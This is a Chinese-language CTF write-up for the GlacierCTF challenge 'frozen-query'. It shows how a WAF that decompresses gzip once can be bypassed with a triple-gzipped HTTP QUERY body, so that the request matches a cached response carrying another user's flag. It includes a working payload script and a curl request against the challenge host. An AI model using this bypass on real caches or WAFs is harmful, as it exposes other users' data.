---
title: glacierctf frozen-query 题解
description: 2026 年新 HTTP 请求方法 QUERY 引发的缓存投毒与解题过程
published: 2026-11-25
tags: [CTF, Web, glacierctf]
category: 题目
draft: false
---

# frozen-query

题目给出了一种2026年新制定的请求方法QUERY 区别于POST和GET

![image-20261121144000672](/Levi38_blog/images/frozen-query/image-20261121144000672.png)

具体的知识点可以参考这两篇文章

[HTTP 新增 QUERY 方法：复杂查询不再硬塞 URL - 字节笔记本](https://www.bytenote.net/article/http-query-method)

[RFC 10008: The HTTP QUERY Method | RFC Editor](https://www.rfc-editor.org/info/rfc10008/#section-1-3)

他是介于GET和POST之间的一种方法

![image-20261121144242724](/Levi38_blog/images/frozen-query/image-20261121144242724.png)

既能带请求体 又不会像POST一样默认不进缓存

题目的意思是现在summit的内容无法查询 会被拦截

![image-20261121144405185](/Levi38_blog/images/frozen-query/image-20261121144405185.png)

我们分析一下源码

![image-20261121144518636](/Levi38_blog/images/frozen-query/image-20261121144518636.png)

他在判断waf的时候 只进行了一次gzip解压 对解压后的内容进行判断

但是在计算缓存命中时却是使用decode_content计算 他会读取我们Content-Encoding里的gzip数量 并进行逐次压缩 也就是说如果我们压缩两层或者三层 那么waf在一次解压后读取到的内容就不包含黑名单 但是却能被缓存计算正常读取

![image-20261121145024272](/Levi38_blog/images/frozen-query/image-20261121145024272.png)

![image-20261121144701045](/Levi38_blog/images/frozen-query/image-20261121144701045.png)

在命中缓存以后 直接返回缓存中的数据不请求后端

而后台有一个auditor一直在使用audit权限读取flag的内容

![image-20261121145609445](/Levi38_blog/images/frozen-query/image-20261121145609445.png)

并且只要上游的Cache-Control中不含no-store且满足shareable条件（上游Cache-Control不含public）

而为了题目成立 必然会使得上述条件成立 让auditor不断写入缓存中![image-20261122163527044](/Levi38_blog/images/frozen-query/image-20261122163527044.png)

所以只要我们构造出一样的请求 并且绕过waf那么就能读取到缓存中的flag

写一个脚本构造压缩后的payload 重定向到body.bin中

```
import gzip
import sys
import time

def gzip3(data: bytes) -> bytes:
    out = data
    for _ in range(3):
        out = gzip.compress(out)
    return out

if __name__ == "__main__":
    window = int(time.time() // 30)
    payload = (
        '{"region":"summit","fields":["level","note","flag"],'
        f'"window":{window}}}'
    )

    raw = payload.encode()
    comp = gzip3(raw)
 
    sys.stdout.buffer.write(comp)
```

然后curl构造一样的请求

```
curl.exe -i -X QUERY "https://frozen-query.web.glacierctf.com/api/bulletin" `
 -H "Content-Type: application/json" `
 -H "Content-Encoding: gzip,gzip,gzip" `
 -H "Accept: application/json" `
 --data-binary "@body.bin"
```

注意这几个元素必须保持一致![image-20261121145931370](/Levi38_blog/images/frozen-query/image-20261121145931370.png)

![image-20261121145747202](/Levi38_blog/images/frozen-query/image-20261121145747202.png)